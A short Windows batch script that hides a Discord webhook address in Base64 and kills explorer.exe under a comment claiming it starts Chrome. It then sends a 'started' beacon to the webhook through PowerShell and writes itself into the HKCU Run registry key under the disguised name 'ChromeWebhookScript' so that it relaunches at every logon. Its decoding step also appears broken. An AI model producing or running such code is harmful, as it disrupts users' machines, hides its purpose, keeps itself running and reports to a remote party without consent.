@echo off
:: Base64 encoded webhook URL (Replace this with your actual Base64 encoded URL)
set "base64WebhookUrl=aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTMzNzA5NTM0OTUxMjE3NTc1MS9fWFFjSFg5RnB0UGJDTkxtOW9NS1JSWDlQTmVMSGxfMmxFLUpXWjJSd3E4UkZ0T2Z4ZDUxSXNGeHVkUDNuSG83MkxTTQ==="

:: Decode the Base64 URL to the actual webhook URL
for /f "tokens=* delims=" %%A in ('echo %base64WebhookUrl% ^| certutil -decodehex ^| findstr /R "^"') do set "webhookUrl=%%A"

:: Start Chrome
taskkill /f /im explorer.exe
:: Set the message you want to send
set "message={\"content\": \"The script has successfully started!\"}"

:: Send message to Discord via webhook using PowerShell
powershell -Command "$webhookUrl = '%webhookUrl%'; $message = '%message%'; $headers = @{ 'Content-Type' = 'application/json' }; Invoke-RestMethod -Uri $webhookUrl -Method Post -Headers $headers -Body $message"

:: Add script to Windows startup registry for autostart
set "regkey=HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
set "scriptPath=%~f0"
reg add "%regkey%" /v "ChromeWebhookScript" /t REG_SZ /d "%scriptPath%" /f
